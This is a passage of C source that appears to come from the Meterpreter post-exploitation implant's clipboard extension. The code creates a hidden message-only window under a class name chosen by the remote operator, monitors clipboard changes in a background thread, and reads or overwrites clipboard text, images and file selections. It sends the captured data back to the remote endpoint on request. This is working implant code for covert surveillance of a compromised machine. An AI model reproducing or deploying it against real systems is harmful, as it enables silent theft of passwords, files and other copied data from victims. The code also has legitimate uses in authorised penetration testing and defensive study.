				dprintf("[EXTAPI CLIPBOARD] Failed to harvest from clipboard %x: %u (%x)", hWnd, dwResult, dwResult);
			}
		}
		else
		{
			dprintf("[EXTAPI CLIPBOARD] thread is no running, ignoring clipboard change %x", hWnd);
		}

		if (pState->hNextViewer)
		{
			dprintf("[EXTAPI CLIPBOARD] Passing on to %x", pState->hNextViewer);
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}

		return 0;

	case WM_DESTROY:
		dprintf("[EXTAPI CLIPBOARD] received WM_DESTROY %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);
		ChangeClipboardChain(hWnd, pState->hNextViewer);

		return 0;

	default:
		dprintf("[EXTAPI CLIPBOARD] received %x for window %x", uMsg);
		return DefWindowProcA(hWnd, uMsg, wParam, lParam);
	}
}

/*!
 * @brief Create a hidden window that will capture clipboard change events.
 * @param pState Pointer to the state entity for the current clipboard thread.
 * @returns Indication of success or failure.
 * @remark This function also registers a random window class.
 */
DWORD create_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;
	BOOL bRegistered = FALSE;
	WNDCLASSEXA wndClass = { 0 };

	ZeroMemory(&wndClass, sizeof(wndClass));
	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = (WNDPROC)clipboard_monitor_window_proc;
	wndClass.hInstance = GetModuleHandleA(NULL);
	wndClass.lpszClassName = pState->cbWindowClass;

	dprintf("[EXTAPI CLIPBOARD] Setting up the monitor window. Class = %s from %p -> %s", wndClass.lpszClassName, pState, pState->cbWindowClass);

	do
	{
		if (!RegisterClassExA(&wndClass))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to register window class.");
		}

		dprintf("[EXTAPI CLIPBOARD] Window registered");
		bRegistered = TRUE;

		pState->hClipboardWindow = CreateWindowExA(0, pState->cbWindowClass, pState->cbWindowClass, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wndClass.hInstance, pState);

		if (pState->hClipboardWindow == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to create message only window instance");
		}

		dprintf("[EXTAPI CLIPBOARD] Window created");
		dwResult = ERROR_SUCCESS;

	} while (0);

	if (pState->hClipboardWindow == NULL && bRegistered)
	{
		dprintf("[EXTAPI CLIPBOARD] Unregistering window class due to failure");
		UnregisterClassA(pState->cbWindowClass, wndClass.hInstance);
	}

	return dwResult;
}

/*!
 * @brief Destroy the hidden clipboard monitor window.
 * @param pState Pointer to the state entity for the current clipboard thread which
 *               contains the window handle.
 * @returns Indication of success or failure.
 * @remark This function also unregisters the random window class.
 */
DWORD destroy_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Destroying clipboard monitor window: %p", pState);
		if (!DestroyWindow(pState->hClipboardWindow))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to destroy the clipboard window");
		}

		if (!UnregisterClassA(pState->cbWindowClass, GetModuleHandleA(NULL)))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to remove the clipboard window class");
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	return dwResult;
}

/*!
 * @brief Handle the request to get the data from the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT  - raw text data.
 *             - CF_DIB   - bitmap/image information.
 *             - CF_HDROP - file selection.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_get_data(Remote *remote, Packet *packet)
{
	DWORD dwResult;
	ClipboardCapture* pCapture = NULL;
	BOOL bDownload = FALSE;
	Packet *pResponse = met_api->packet.create_response(packet);

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
		}

		bDownload = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD);

		if ((dwResult = capture_clipboard(bDownload, &pCapture)) != ERROR_SUCCESS)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] failed to read clipboard data");
		}

		dprintf("[EXTAPI CLIPBOARD] writing to socket");
		dump_clipboard_capture(pResponse, pCapture, bDownload);
		dprintf("[EXTAPI CLIPBOARD] written to socket");

		free(pCapture);

		dwResult = GetLastError();
	} while (0);

	if (pResponse)
	{
		dprintf("[EXTAPI CLIPBOARD] sending response");
		met_api->packet.transmit_response(dwResult, remote, pResponse);
	}

	return dwResult;
}

/*!
 * @brief Handle the request to set the data that's on the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT - raw text data.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
{
	DWORD dwResult;
	PCHAR lpClipString;
	HGLOBAL hClipboardData;
	PCHAR lpLockedData;
	SIZE_T cbStringBytes;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
		}

		if ((lpClipString = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT)) == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] No string data specified", ERROR_INVALID_PARAMETER);
		}

		cbStringBytes = (SIZE_T)strlen(lpClipString) + 1;

		// do the "use the right kind of memory once locked" clip board data dance.
		// Note that we don't free up the memory we've allocated with GlobalAlloc
		// because the windows clipboard magic does it for us.
		if ((hClipboardData = pGlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, cbStringBytes)) == NULL)
		{
			dwResult = GetLastError();
			pCloseClipboard();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Failed to allocate clipboard memory", dwResult);
		}

		lpLockedData = (PCHAR)pGlobalLock(hClipboardData);

		memcpy_s(lpLockedData, cbStringBytes, lpClipString, cbStringBytes);

		pGlobalUnlock(hClipboardData);

		// Try to get a lock on the clipboard
		if (!open_clipboard_with_retries(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
		}

		// Clear the clipboard data
		pEmptyClipboard();

		if (!pSetClipboardData(CF_TEXT, hClipboardData))
		{
			dwResult = GetLastError();
			dprintf("[EXTAPI CLIPBOARD] Failed to set the clipboad data: %u", dwResult);
		}
		else
		{
			dwResult = ERROR_SUCCESS;
		}

		pCloseClipboard();

	} while (0);

	// If something went wrong and we have clipboard data, then we need to
	// free it up because the clipboard can't do it for us.
	if (dwResult != ERROR_SUCCESS && hClipboardData != NULL)
	{
		pGlobalFree(hClipboardData);
	}

	met_api->packet.transmit_empty_response(remote, packet, dwResult);

	return dwResult;
}

/*!
 * @brief Function which executes the clipboard monitoring.
 * @param thread Pointer to the thread context.
 * @remark This function also handles cross-thread synchronisation with
 *         callers that want to interact with the clipboard data.
 */
DWORD THREADCALL clipboard_monitor_thread_func(THREAD * thread)
{
	DWORD dwResult;
	BOOL bTerminate = FALSE;
	HANDLE waitableHandles[3] = {0};
	MSG msg;
	ClipboardState* pState = (ClipboardState*)thread->parameter1;

	do
	{
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Thread state is NULL", ERROR_INVALID_PARAMETER);
		}

		dwResult = create_clipboard_monitor_window(pState);
		if (dwResult != ERROR_SUCCESS)
		{
			break;
		}

		// signal to the caller that our thread has started
		dprintf("[EXTAPI CLIPBOARD] Thread started");
		pState->bRunning = TRUE;
		met_api->event.signal(pState->hResponseEvent);

		waitableHandles[0] = thread->sigterm->handle;
		waitableHandles[1] = pState->hPauseEvent->handle;
		waitableHandles[2] = pState->hResumeEvent->handle;

		dprintf("[EXTAPI CLIPBOARD] thread wait handle : %x", waitableHandles[0]);
		dprintf("[EXTAPI CLIPBOARD] pause wait handle  : %x", waitableHandles[1]);
		dprintf("[EXTAPI CLIPBOARD] resume wait handle : %x", waitableHandles[2]);

		while (!bTerminate)
		{
			dwResult = WaitForMultipleObjects(3, waitableHandles, FALSE, 1) - WAIT_OBJECT_0;

			switch (dwResult)
			{
			case 0: // stop the thread
				dprintf("[EXTAPI CLIPBOARD] Thread stopping");
				bTerminate = TRUE;
				break;
			case 1: // pause the thread
				dprintf("[EXTAPI CLIPBOARD] Thread paused");
				pState->bRunning = FALSE;
				// indicate that we've paused
				met_api->event.signal(pState->hResponseEvent);
				break;
			case 2: // resume the thread
				dprintf("[EXTAPI CLIPBOARD] Thread resumed");
				pState->bRunning = TRUE;
				// indicate that we've resumed
				met_api->event.signal(pState->hResponseEvent);
				break;
			default:
				// timeout, so pump messages
				if (pState->hClipboardWindow && PeekMessageA(&msg, pState->hClipboardWindow, 0, 0, PM_REMOVE))
				{
					dprintf("[EXTAPI CLIPBOARD] Pumping message");
					TranslateMessage(&msg);
					DispatchMessageA(&msg);
				}
				break;
			}
		}

		// and we're done, switch off, and tell the caller we're done
		pState->bRunning = FALSE;
		destroy_clipboard_monitor_window(pState);
		met_api->event.signal(pState->hResponseEvent);
		dprintf("[EXTAPI CLIPBOARD] Thread stopped");

	} while (0);

	return dwResult;
}

/*!
 * @brief Clean up all the state associated with a monitor thread.
 * @param pState Pointer to the state clean up.
 */
VOID destroy_clipboard_monitor_state(ClipboardState** ppState)
{
	dprintf("[EXTAPI CLIPBOARD] Destroying clipboard monitor state");
	if (ppState != NULL && (*ppState) != NULL)
	{
		ClipboardState* pState = *ppState;
		if (pState->hThread != NULL)
		{
			met_api->thread.destroy(pState->hThread);
		}
		if (pState->hPauseEvent != NULL)
		{
			met_api->event.destroy(pState->hPauseEvent);
		}
		if (pState->hResumeEvent != NULL)
		{
			met_api->event.destroy(pState->hResumeEvent);
		}
		if (pState->hResponseEvent != NULL)
		{
			met_api->event.destroy(pState->hResponseEvent);
		}
		destroy_clipboard_monitor_capture(&pState->captureList, TRUE);

		free(pState);
		*ppState = NULL;
	}
}

/*!
 * @brief Handle the request to start the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	ClipboardState* pState = NULL;
	char* lpClassName = NULL;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
		}

		if (gClipboardState != NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread already running", ERROR_ALREADY_INITIALIZED);
		}

		dprintf("[EXTAPI CLIPBOARD] Starting clipboard monitor");

		pState = (ClipboardState*)malloc(sizeof(ClipboardState));
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard state", ERROR_NOT_ENOUGH_MEMORY);
		}

		dprintf("[EXTAPI CLIPBOARD] pState %p", pState);
		memset(pState, 0, sizeof(ClipboardState));

		lpClassName = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_MON_WIN_CLASS);
		if (lpClassName == NULL || strlen(lpClassName) == 0)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Window class name is missing", ERROR_INVALID_PARAMETER);
		}

		strncpy_s(pState->cbWindowClass, sizeof(pState->cbWindowClass), lpClassName, sizeof(pState->cbWindowClass) - 1);
		dprintf("[EXTAPI CLIPBOARD] Class Name set to %s", pState->cbWindowClass);

		pState->bCaptureImageData = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);

		pState->hPauseEvent = met_api->event.create();
		pState->hResumeEvent = met_api->event.create();
		pState->hResponseEvent = met_api->event.create();
		pState->captureList.pClipboardCaptureLock = met_api->lock.create();

		if (pState->hPauseEvent == NULL
			|| pState->hResumeEvent == NULL
			|| pState->hResponseEvent == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard events", ERROR_NOT_ENOUGH_MEMORY);
		}

		pState->hThread = met_api->thread.create((THREADFUNK)clipboard_monitor_thread_func, pState, NULL, NULL);

		if (pState->hThread == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard thread", ERROR_NOT_ENOUGH_MEMORY);
		}

		gClipboardState = pState;
		met_api->thread.run(pState->hThread);

		// 4 seconds should be long enough for the thread to indicate it's started, if not, bomb out
		if (!met_api->event.poll(pState->hResponseEvent, 4000))
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Thread failed to start correctly", ERROR_ABANDONED_WAIT_0);
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	if (dwResult == ERROR_ALREADY_INITIALIZED)
	{
		// if we've already been initialised, then we don't want to go
		// resetting gClipboardState back to NULL because that means
		// the existing monitor will run indefinitely! Instead we will
		// just simulate success here
		dwResult = ERROR_SUCCESS;
	}
	else if (dwResult != ERROR_SUCCESS)
	{
		destroy_clipboard_monitor_state(&pState);
		gClipboardState = NULL;
	}

	met_api->packet.transmit_empty_response(remote, packet, dwResult);

	return dwResult;
}

/*!
 * @brief Pause the monitor thread, if it's running.
 * @param pState Pointer to the clipboard monitor thread state.
 * @returns Always returns \c ERROR_SUCCESS.
 */
DWORD clipboard_monitor_pause(ClipboardState* pState)
{
	if (pState->bRunning)
	{
		met_api->event.signal(pState->hPauseEvent);
		met_api->event.poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

/*!
 * @brief Resume the monitor thread.
 * @param pState Pointer to the clipboard monitor thread state.
 * @returns Always returns \c ERROR_SUCCESS.
 */
DWORD clipboard_monitor_resume(ClipboardState* pState)
{
	if (!pState->bRunning)
	{
		met_api->event.signal(pState->hResumeEvent);
		met_api->event.poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

/*!
 * @brief Handle the request to pause the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_pause(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		dprintf("[EXTAPI CLIPBOARD] Pausing clipboard monitor");

		dwResult = clipboard_monitor_pause(gClipboardState);
	} while (0);

	met_api->packet.transmit_empty_response(remote, packet, dwResult);

	return dwResult;
}

/*!
 * @brief Handle the request to resume the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_resume(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		dprintf("[EXTAPI CLIPBOARD] Resuming clipboard monitor");

		dwResult = clipboard_monitor_resume(gClipboardState);
	} while (0);

	met_api->packet.transmit_empty_response(remote, packet, dwResult);

	return dwResult;
}

/*!
 * @brief Handle the request to stop the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bDump = TRUE;
	BOOL bIncludeImages = TRUE;
	Packet *pResponse = met_api->packet.create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
		}

		dprintf("[EXTAPI CLIPBOARD] Stopping clipboard monitor");
		bDump = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DUMP);
		bIncludeImages = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);

		// now stop the show
		met_api->event.signal(gClipboardState->hThread->sigterm);

		// if they don't terminate in a reasonable period of time...
		if (!met_api->event.poll(gClipboardState->hResponseEvent, 10000))
		{
			// ... FINISH HIM!
			dprintf("[EXTAPI CLIPBOARD] Brutally terminating the thread for not responding fast enough");
			met_api->thread.kill(gClipboardState->hThread);
		}

		if (bDump)
		{
			dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, TRUE);
		}

		destroy_clipboard_monitor_state(&gClipboardState);
		dwResult = ERROR_SUCCESS;
	} while (0);

	met_api->packet.transmit_response(dwResult, remote, pResponse);

	return dwResult;
}

/*!
 * @brief Handle the request to dump the contents of the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_dump(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bIncludeImages = TRUE;
	BOOL bPurge = TRUE;
	Packet *pResponse = met_api->packet.create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}
		bIncludeImages = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);
		bPurge = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_PURGE);

		dprintf("[EXTAPI CLIPBOARD] Purging? %s", bPurge ? "TRUE" : "FALSE");

		dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, bPurge);

		if (bPurge)
		{
			met_api->lock.acquire(gClipboardState->captureList.pClipboardCaptureLock);
			destroy_clipboard_monitor_capture(&gClipboardState->captureList, FALSE);
			met_api->lock.release(gClipboardState->captureList.pClipboardCaptureLock);
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	met_api->packet.transmit_response(dwResult, remote, pResponse);

	return dwResult;
}

/*!
 * @brief Handle the request to purge the contents of the clipboard monitor.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_clipboard_monitor_purge(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bIncludeImages = TRUE;
	BOOL bPurge = TRUE;
	Packet *pResponse = met_api->packet.create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		met_api->lock.acquire(gClipboardState->captureList.pClipboardCaptureLock);
		destroy_clipboard_monitor_capture(&gClipboardState->captureList, FALSE);
		met_api->lock.release(gClipboardState->captureList.pClipboardCaptureLock);

		dwResult = ERROR_SUCCESS;
	} while (0);

	met_api->packet.transmit_response(dwResult, remote, pResponse);

	return dwResult;
}
